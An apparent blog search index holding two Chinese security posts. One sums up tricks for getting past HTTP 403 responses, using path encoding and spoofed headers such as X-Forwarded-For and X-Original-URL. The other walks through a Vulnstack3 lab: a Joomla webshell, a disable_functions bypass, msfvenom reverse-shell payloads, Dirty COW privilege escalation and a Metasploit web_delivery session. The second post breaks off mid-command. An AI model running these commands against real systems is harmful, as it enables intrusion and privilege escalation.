<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>bypass403总结</title>
      <link href="/posts/2d8.html"/>
      <url>/posts/2d8.html</url>
      
        <content type="html"><![CDATA[<h1 id="bypass403"><a href="#bypass403" class="headerlink" title="bypass403"></a>bypass403</h1><p>对于日常渗透测试中，会经常目录扫描扫到一堆403，而对于200的状态码没有一些思路的时候就可以尝试bypass403</p><h2 id="一-扩展名绕过"><a href="#一-扩展名绕过" class="headerlink" title="一.扩展名绕过"></a>一.扩展名绕过</h2><pre><code>com/admin   403com/admin/  200com/admin//  200com//admin//  200com/admin/*   200com/admin/*/  200com/admin/.   200com/admin/./    200com/./admin/./    200com/./admin/...  200com/admin/./.    200com/admin/./.    200com/admin?        200com/admin??        200com/admin???    200com/admin..;/    200com/admin/..;/    200com/%2f/admin    200com/%2e/admin    200com/admin%20/    200com/admin%09/    200com/%20admin%20/    200</code></pre><p>参考ascii表<a href="http://c.biancheng.net/c/ascii/" target="_blank" rel="noopener">http://c.biancheng.net/c/ascii/</a></p><p>%2f 解码后是/   %2e 解码后是.   %20解码后可以说是网页的空格（像sql注入，xss当空格过滤可以尝试bypass）</p><p>%09 解码后是水平制表符也就是tab键 </p><p>但是我觉得像url编码这个问题可以用burp fuzz测试一下，看看哪些url编码可以绕过</p><h2 id="二-通过代理绕过"><a href="#二-通过代理绕过" class="headerlink" title="二.通过代理绕过"></a>二.通过代理绕过</h2><p>在酒仙桥的文章中说了在Nginx代理识别访问端IP限制对接口的访问。那么先来看看什么是Nginx的代理识别访问端</p><p>看这个Nginx的配置</p><pre><code>server {        listen       80;        server_name ashupup.top; // 接口的域名        access_log  /usr/local/etc/nginx/logs/access.log main; //access_log访问日志        location / {                proxy_pass http://127.0.0.1:8080/;                proxy_redirect      off;                # 这里的匹配规则是从上往下，匹配到则会马上跳出，忽略后续的规则。                allow 192.168.100.0/30;#允许ip段，all为所有 这里允许访问的IP范围为：192.168.100.1～192.168.100.3                deny all; #禁用ip段，all为所有        }}</code></pre><p>proxy_pass指令是用来设置代理服务器的地址</p><p>先看前面allow的意思。</p><blockquote><p>server_name后面是我们定义的接口域名，但我们访问<a href="http://ashupup.top/xxxx这样的接口的时候，就会通过location反向代理到了http://127.0.0.1:8080/上面来了，也就是http://127.0.0.1:8080/xxxx" target="_blank" rel="noopener">http://ashupup.top/xxxx这样的接口的时候，就会通过location反向代理到了http://127.0.0.1:8080/上面来了，也就是http://127.0.0.1:8080/xxxx</a></p></blockquote><h3 id="简单来理解一下Nginx代理里面的四种情况"><a href="#简单来理解一下Nginx代理里面的四种情况" class="headerlink" title="简单来理解一下Nginx代理里面的四种情况"></a>简单来理解一下Nginx代理里面的四种情况</h3><h4 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h4><pre><code>location / {                proxy_pass http://127.0.0.1:8080/;  #配置1                proxy_pass http://127.0.0.1:8080;    #配置2                proxy_redirect      off;</code></pre><p>可以看到这时候的location后面先不跟任何东西，再来看8080后面有/和没有/</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025223545531.png" alt="image-20211025223545531"></p><p>配置1：当我们访问ashupup.top/test.xml    代理后就变成  127.0.0.1/test.xml</p><p>配置2：当我们访问ashupup.top/test.xml    代理后就变成 127.0.0.1/test.xml  </p><p>可以看到没有区别还是一样的</p><h4 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h4><p>但是当location后面变成/qq/</p><pre><code>location /qq/ {                proxy_pass http://127.0.0.1:8080/;  #配置1                proxy_pass http://127.0.0.1:8080;    #配置2                proxy_redirect      off;</code></pre><p>配置1：当我们访问ashupup.top/qq/test.xml    代理后就变成  127.0.0.1/test.xml</p><p>配置2：当我们访问ashupup.top/qq/test.xml    代理后就变成 127.0.0.1/qq/test.xml  </p><h4 id="情况三"><a href="#情况三" class="headerlink" title="情况三"></a>情况三</h4><pre><code>location / {                proxy_pass http://127.0.0.1:8080/yyy;  配置1                proxy_redirect      off;location /qq/ {                proxy_pass http://127.0.0.1:8080/yyy;  #配置2</code></pre><p>配置1：当我们ashupup.top/xxx的时候  代理后就会变成127.0.0.1:8080/yyyxxx   而不是127.0.0.1:8080/xxx</p><p>配置2：当我们ashupup.top/qq/xxx的时候   代理后就变成127.0.0.1:8080/yyyxxx</p><h4 id="情况四"><a href="#情况四" class="headerlink" title="情况四"></a>情况四</h4><pre><code>location / {                proxy_pass http://127.0.0.1:8080/yyy/;  配置1                proxy_redirect      off;location /qq/ {                proxy_pass http://127.0.0.1:8080/yyy/;  #配置2</code></pre><p>配置1：当我们ashupup.top/xxx的时候  代理后就会变成127.0.0.1:8080/yyy/xxx</p><p>配置2：当我们ashupup.top/qq/xxx的时候   代理后就变成127.0.0.1:8080/yyy/xxx</p><h3 id="回归正题"><a href="#回归正题" class="headerlink" title="回归正题"></a>回归正题</h3><pre><code>allow 192.168.100.0/30;#允许ip段，all为所有 这里允许访问的IP范围为：192.168.100.1～192.168.100.3</code></pre><p>在这设置了白名单，正因为如此，那么当我们不在白名单范围的ip地址，就会出现403</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026215811321.png" alt="image-20211026215811321"></p><pre><code>- X-Originating-IP: 127.0.0.1- X-Remote-IP: 127.0.0.1- X-Client-IP: 127.0.0.1- X-Forwarded-For: 127.0.0.1- X-Forwared-Host: 127.0.0.1- X-Host: 127.0.0.1- X-Custom-IP-Authorization: 127.0.0.1</code></pre><p>一般在邮件的位置，查看源文件可以看到 X-Originating-IP   泄露了发件人的真实ip地址</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026221611144.png" alt="image-20211026221611144"></p><p>remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web<a href="https://www.baidu.com/s?wd=服务器&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd" target="_blank" rel="noopener">服务器</a>（<a href="https://www.baidu.com/s?wd=Nginx&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd" target="_blank" rel="noopener">Nginx</a>，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP</p><p>XFF头（X-Forwarded-For），它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了<strong>HTTP 代理或者负载均衡服务器</strong>时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre><code>请求GET /login HTTP/1.1回包HTTP/1.1 403 Forbidden</code></pre><p>绕过</p><pre><code>GET /login HTTP/1.1X-Forwarded-For: 127.0.0.1HTTP/1.1 200 OKGET / HTTP/1.1X-Forwarded-For: /loginHTTP/1.1 200 OK</code></pre><h4 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026223759144.png" alt="image-20211026223759144"></p><p>因为只允许本地，那么就会想到127.0.0.1  再去上面添加XFF头就能绕过</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026223853656.png" alt="image-20211026223853656"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026223907776.png" alt="image-20211026223907776"></p><p>在Replace里面添加X-Forwarded-For：127.0.0.1  添加之后每次请求中，请求包中都会添加一个XFF头</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026224012211.png" alt="image-20211026224012211"></p><p>发包过去<img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026224051650.png" alt="image-20211026224051650"></p><h2 id="三-覆盖请求URL"><a href="#三-覆盖请求URL" class="headerlink" title="三.覆盖请求URL"></a>三.覆盖请求URL</h2><p>在前面的代理绕过的时候看到X-Originating-IP: 127.0.0.1   如果不小心还会看成了X-Original-URL</p><pre><code>Request  GET /login HTTP/1.1  Response  HTTP/1.1 403 Forbidden  Reqeust  GET / HTTP/1.1  X-Original-URL: /login  Response  HTTP/1.1 200 OK  or  Reqeust  GET / HTTP/1.1  X-Rewrite-URL: /login  Response  HTTP/1.1 200 OK</code></pre><p>burp学院的绕过基于URL的访问控制</p><p>这关使用X-Originating-IP绕过</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027220018280.png" alt="image-20211027220018280"></p><p>X-Originating-IP: /admin</p><p>抓包放到repeter里面</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027220305138.png" alt="image-20211027220305138"></p><p>可以看到是403</p><p>添加X-Originating-IP: /admin头</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027220340608.png" alt="image-20211027220340608"></p><p>发现还是403，但是删除请求头里面的/admin</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027220428132.png" alt="image-20211027220428132"></p><p>成功200绕过</p><h2 id="四-Referer标头绕过"><a href="#四-Referer标头绕过" class="headerlink" title="四.Referer标头绕过"></a>四.Referer标头绕过</h2><p>像referer头一般就会想到CSRF和Jsonp跨域漏洞，因为都跟这个referer头有关</p><p>而Referer头的意思就是请求源的地址，也就是告诉服务器我是从哪个页面链接过来的</p><p>还有一个origin 它跟referer都是代表来自哪里，但是origin一般用于跨域的时候，表示来自哪个域</p><p>比如访问某个IP地址的test.txt文件</p><pre><code>origin：http://x.x.x.xreferer：http://x.x.x.x/test.txt</code></pre><p>常见方式</p><pre><code>RequestGET /auth/login HTTP/1.1Host: xxxResponseHTTP/1.1 403 ForbiddenReqeustGET / HTTP/1.1Host: xxxReFerer:https://xxx/auth/loginResponseHTTP/1.1 200 OK</code></pre><h3 id="基于Referer头的访问控制"><a href="#基于Referer头的访问控制" class="headerlink" title="基于Referer头的访问控制"></a><strong>基于Referer头的访问控制</strong></h3><p>burp学院的实验题目</p><p>登录administrator账号密码admin     </p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027212557762.png" alt="image-20211027212557762"></p><p>把carlos提权，并进行抓包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027212700151.png" alt="image-20211027212700151"></p><p>放到repeater里面,把referer复制下来</p><p>退出使用wiener登录,抓取session，替换掉原来管理员的session</p><p>回到刚才repeater的地方</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027214152802.png" alt="image-20211027214152802"></p><p>发包查看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027214247023.png" alt="image-20211027214247023"></p><p>出现Unauthorized  没有认证，仔细看里面的referer我删除了</p><p>添加referer头</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027214319989.png" alt="image-20211027214319989"></p><p>出现302成功绕过，而这个referer头是登录管理员后的referer头</p><h2 id="五，修改请求方法POST-GET绕过"><a href="#五，修改请求方法POST-GET绕过" class="headerlink" title="五，修改请求方法POST GET绕过"></a>五，修改请求方法POST GET绕过</h2><p>在burp学院的题目</p><p>首先登录管理员账户，提升carlos的权限，并且抓包，放到repeater里面去。</p><p>，然后退出登录普通用户，抓取session</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028154521425.png" alt="image-20211028154521425"></p><p>然后在请求方式的地方，把POST改成POSTX</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028154551515.png" alt="image-20211028154551515"></p><p>提示缺少url参数username</p><p>那尝试改成get类型</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028154650202.png" alt="image-20211028154650202"></p><p>出现302绕过</p><h2 id="六-修改HOST"><a href="#六-修改HOST" class="headerlink" title="六.修改HOST"></a>六.修改HOST</h2><p>什么是host：指定请求服务器的域名/IP地址和端口号。或者当几个网站都部署在了一个服务器上面的时候，可以通过host头来判断请求。也就是说当很多域名都部署在了一个ip地址上面的时候，网站会通过host头来判断当前请求的地方，而对于host头是可以被用户控制的，只要存在控制修改，就有可能存在问题。</p><p>因为没有实例图，但是具体方法就是收集子域名，整理好之后通过burp的暴力破解模块来绕过</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>插件安装：<a href="https://github.com/sting8k/BurpSuite_403Bypasser" target="_blank" rel="noopener">https://github.com/sting8k/BurpSuite_403Bypasser</a></p><p>下载插件</p><pre><code>git clone https://github.com/sting8k/BurpSuite_403Bypasser.git</code></pre><pre><code>BurpSuite -&gt; Extender -&gt; Extensions -&gt; Add -&gt; Extension Type: Python -&gt; Select file: 403bypasser.py -&gt; Next till Finish</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028163940305.png" alt="image-20211028163940305"></p><p>python编写的脚本：<a href="https://github.com/lobuhi/byp4xx" target="_blank" rel="noopener">https://github.com/lobuhi/byp4xx</a></p><p>使用方法</p><pre><code>git clone https://github.com/lobuhi/byp4xx.gitcd byp4xxchmod u+x byp4xx.sh使用./byp4xx.sh [OPTIONS] http(s)://url/path</code></pre><p>sh脚本 ：<a href="https://github.com/Dheerajmadhukar/4-ZERO-3" target="_blank" rel="noopener">https://github.com/Dheerajmadhukar/4-ZERO-3</a></p><pre><code>$ bash 403-bypass.sh https://target.com/secret</code></pre><p>参考链接：</p><p><a href="https://juejin.cn/post/6859253589018148871" target="_blank" rel="noopener">https://juejin.cn/post/6859253589018148871</a></p><p><a href="https://dm116.github.io/2020/01/28/Bypass-HTTP-Basic-Authentication-with-Nmap-and-Metasploit/" target="_blank" rel="noopener">https://dm116.github.io/2020/01/28/Bypass-HTTP-Basic-Authentication-with-Nmap-and-Metasploit/</a></p><p><a href="https://mp.weixin.qq.com/s/gUIEGzZdMfYHYlrST8R4Ow" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gUIEGzZdMfYHYlrST8R4Ow</a></p><p><a href="https://lw0f.fun/2021/01/17/403%E7%BB%95%E8%BF%87%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">https://lw0f.fun/2021/01/17/403%E7%BB%95%E8%BF%87%E5%B0%8F%E7%BB%93/</a></p><p><a href="https://www.codeleading.com/article/92285937634/#URI_1" target="_blank" rel="noopener">https://www.codeleading.com/article/92285937634/#URI_1</a></p><p><a href="https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ</a></p>]]></content>
      
      
      <categories>
          
          <category> bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnstack3靶场</title>
      <link href="/posts/4985.html"/>
      <url>/posts/4985.html</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnstack3"><a href="#Vulnstack3" class="headerlink" title="Vulnstack3"></a>Vulnstack3</h1><p>拓扑图</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020214329165.png" alt="image-20211020214329165"></p><p>前期准备，需要给虚拟机网卡添加VMnet2,</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020214902924.png" alt="image-20211020214902924"></p><h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p>第一步肯定是获取ip地址，打开靶机后能看eth0的IP地址。</p><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><pre><code>nmap -T4 -sV -O -p 0-65535 192.168.1.110</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020220649319.png" alt="image-20211020220649319"></p><p>可以看到开放了22，80，3306端口</p><p>访问80端口</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020221229470.png" alt="image-20211020221229470"></p><p>可以看到joomla的cms，还记得打vulnhub的靶机打了好多joomla的cms，都是进后台修改源码然后getshell的。</p><p>joomscan下载地址：<a href="https://github.com/OWASP/joomscan" target="_blank" rel="noopener">https://github.com/OWASP/joomscan</a></p><pre><code>perl joomscan.pl -u http://192.168.1.110</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020224059797.png" alt="image-20211020224059797"></p><p>直接访问robot.txt</p><p>来了个目录遍历，翻翻看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020224559581.png" alt="image-20211020224559581"></p><p>翻了半天没发现啥泄露的</p><p>去谷歌查了一下，该版本的存在的漏洞，存在一个（CVE-2020-10238）Joomal &lt;= 3.9.15 远程命令执行漏洞</p><p>还有CVE-2021-23132 复现地址：<a href="http://www.dmkxy.me/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">http://www.dmkxy.me/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p>但是这需要登录后台才能利用</p><p>复现漏洞：<a href="https://www.zhihuifly.com/t/topic/3000" target="_blank" rel="noopener">https://www.zhihuifly.com/t/topic/3000</a></p><p>扫描目录（我用了kali自带的目录扫描工具dirb）</p><pre><code>dirb http://192.168.43.57/</code></pre><p>没扫出来个什么有用的，换个dirsearch</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025164643496.png" alt="image-20211025164643496"></p><p>果然不一样，扫出来web.config文件，打开后也是没什么利用价值</p><p>磨了半天，发现自己的前面的joomscan扫出来个敏感路径，自己没注意到。。。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025164947026.png" alt="image-20211025164947026"></p><p>访问</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025165158750.png" alt="image-20211025165158750"></p><p>果然有东西，想到之前扫到的mysql的3306端口，使用navicat来连接</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025165734547.png" alt="image-20211025165734547"></p><p>进去后直接找users，可惜加密了，解不开。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025170242638.png" alt="image-20211025170242638"></p><p>因为之前在做某个考试题目的时候就是我拿到了数据库，但是密码解不开，一直卡着不知道。但后来出来思路才打开，应该创建一个账号密码。</p><p>刚好joomla官方就有说明</p><p><a href="https://www.it-swarm.cn/zh/mysql/%E5%9C%A8joomla%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E7%94%A8%E6%88%B7/l958098107/" target="_blank" rel="noopener">https://www.it-swarm.cn/zh/mysql/%E5%9C%A8joomla%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E7%94%A8%E6%88%B7/l958098107/</a></p><p>joomla管理员修改和恢复方法</p><p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025172515610.png" alt="image-20211025172515610"></p><p>官方给的joomla添加用户的sql注入命令   账号未admin2  密码为secret</p><pre><code>INSERT INTO `jos31_users`   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)VALUES ('Administrator2', 'admin2',    'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());INSERT INTO `jos31_user_usergroup_map` (`user_id`,`group_id`)VALUES (LAST_INSERT_ID(),'8');</code></pre><p>但是这里得修改表得名称</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025172853690.png" alt="image-20211025172853690"></p><p>刷新一下</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025173704765.png" alt="image-20211025173704765"></p><h3 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2.getshell"></a>2.getshell</h3><p>常见得joomla的getshell的方式就是，修改模板的index.php 写上一句话木马</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025174159458.png" alt="image-20211025174159458"></p><p>使用蚁剑连接</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025174356202.png" alt="image-20211025174356202"></p><p>命令执行被禁止，想到disable_functions</p><p>使用蚁剑插件查看phpinfo信息</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025174824482.png" alt="image-20211025174824482"></p><p>得到真实的ip地址，可以想到是做了反向代理</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025175318269.png" alt="image-20211025175318269"></p><p>翻了一下phpinfo<img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025180400955.png" alt="image-20211025180400955"></p><p>正好文件路径可写没有限制，也有iconv的绕过disable_functions，密码ant</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211025180453994.png" alt="image-20211025180453994"></p><p>web根目录</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026110213306.png" alt="image-20211026110213306"></p><p>但是执行后蚁剑一直返回为空。无奈换别的绕过</p><p>因为php&gt;7 所以我尝试了，直接就可以执行了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026111118646.png" alt="image-20211026111118646"></p><p>下面两个方式都是在出网条件才使用，因为写都写了不忍心删了，后来才想起来我拿到是shell是内网的，没搭建隧道出不了网</p><h3 id="3-上线cs（失败）"><a href="#3-上线cs（失败）" class="headerlink" title="3.上线cs（失败）"></a>3.上线cs（失败）</h3><p>利用cs的CrossC2.cna插件上线cs</p><p>而这个工具是只能beacon https的，所以监听选择https</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026115126905.png" alt="image-20211026115126905"></p><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211026115853354.png" alt="image-20211026115853354"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026115818260.png" alt="image-20211026115818260"></p><p>没上线成功，我一开始以为是我的问题，测试别的虚拟机能成功上线，出网探测一下</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026125927882.png" alt="image-20211026125927882"></p><p>只有DNS能出网。</p><p>不影响，采用执行文件形式上线cs</p><p>使用CrossC2生成一个可执行文件，需要跟监听的https的ip一致</p><pre><code>./genCrossC2.Linux [host] [port] [getURI] [postURI] [platform] [arch] [outputFileName] -platform  'MacOS' / 'Linux'   -arch  'x86' / 'x64'./genCrossC2.Linux x.x.x.x 443 null null Linux x64 名称</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026133757368.png" alt="image-20211026133757368"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026134919218.png" alt="image-20211026134919218"></p><p>但是我等了半天也没有上线</p><h3 id="4-msf的elf上线（失败）"><a href="#4-msf的elf上线（失败）" class="headerlink" title="4.msf的elf上线（失败）"></a>4.msf的elf上线（失败）</h3><pre class="line-numbers language-groovy"><code class="language-groovy">msfvenom <span class="token operator">-</span>p linux<span class="token string">/x86/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>x<span class="token operator">.</span>x<span class="token operator">.</span>x<span class="token operator">.</span>x LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f elf <span class="token operator">></span> shell<span class="token operator">.</span>elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也失败</p><p>回到蚁剑ifconfig一下</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026141917108.png" alt="image-20211026141917108"></p><p>后来我才想到这是不出网的内网，只是反向代理到了可以出网的Nginx的服务器上，本身我们拿到的shell就是不出网的，所以反弹不出来的。</p><p>也算是思路，虽然失败了。</p><p>前面明明都看phpinfo后知道这是内网做了代理了，还一个劲的上线，做着做着就忘了，都上线不了才想起来。</p><p>所以就想到拿下做Nginx反向代理的服务器也就是centos，利用它来进行内网渗透。</p><h2 id="内网-centos"><a href="#内网-centos" class="headerlink" title="内网-centos"></a>内网-centos</h2><p>有了前面的教训，对于不出网的肯定是反弹不了的。</p><p>先信息收集一波ubuntu的（反正都拿到shell）</p><pre><code>uname -a    # 获取所有版本信息uname -m    # 获取Linux内核架构cat /proc/version    # 获取内核信息cat /etc/*-release   # 发布信息cat /etc/issue    # 发布信息hostname    # 获取主机名cat /etc/passwd    # 列出系统所有用户cat /etc/group    # 列出系统所有组w    # 查看目前登录的用户whoami    # 查看当前用户id    # 查看当前用户信息sudo -l    # 列出目前用户可执行与无法执行的指令ps aux    # 查看进程信息ls -la /etc/cron*    # 查看计划任务ifconfig -a    # 列出网络接口信息cat /etc/network/interfaces    # 列出网络接口信息arp -a    # 查看系统arp表route    # 打印路由信息netstat -anplt    # 打印本地端口开放信息iptables -L    # 列出iptable的配置规则</code></pre><p>端口探测的时候发现开启了22端口</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026142739311.png" alt="image-20211026142739311"></p><p>而在tmp/mysql的目录下发现了test.txt</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026143653802.png" alt="image-20211026143653802"></p><p>因为之前nmap扫出来了22，80，3306端口，那这个会不会是centos的账号密码</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026144233072.png" alt="image-20211026144233072"></p><p>竟然成功了。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026151855769.png" alt="image-20211026151855769"></p><p>确实做了代理</p><p>拿到了shell就先信息收集，尝试了知道的提权方法都不太行。看了一下内核</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026153902021.png" alt="image-20211026153902021"></p><p>有查了一下脏牛的范围Linux内核 &gt;= 2.6.22</p><p>尝试使用以下</p><h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>如果目标服务器有gcc就可以直接上传.c，如果没有需要本地生成上传</p><pre><code>gcc -pthread dirty.c -o exe -lcrypt</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026154104595.png" alt="image-20211026154104595"></p><p>赋予高权限，防止没有权限</p><pre><code>chmod 777 exe</code></pre><p>运行exe 并设置密码为ash</p><pre><code>./exe ash</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026154415848.png" alt="image-20211026154415848"></p><p>账号：firefart  密码ash</p><pre><code>cat /etc/passwd查看</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026154446409.png" alt="image-20211026154446409"></p><pre><code>su firefart  提权成功</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026154607133.png" alt="image-20211026154607133"></p><h3 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h3><p>采用msf模块的exploit/multi/script/web_delivery</p><pre><code>use exploit/multi/script/web_deliveryoptionsset target linuxset lhost x.x.x.xset patload linux/x64/meterpreter/reverse_tcprun</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026162049515.png" alt="image-20211026162049515"></p><p>之后复制命令进去刚拿到的centos里面</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026162115225.png" alt="image-20211026162115225"></p><p>等待一下，成功上线</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026162154920.png" alt="image-20211026162154920"></p><p>因为想要扫描内网，所以需要添加内网网段，目前知道的就是192.168.93.0/24</p><pre><code>run 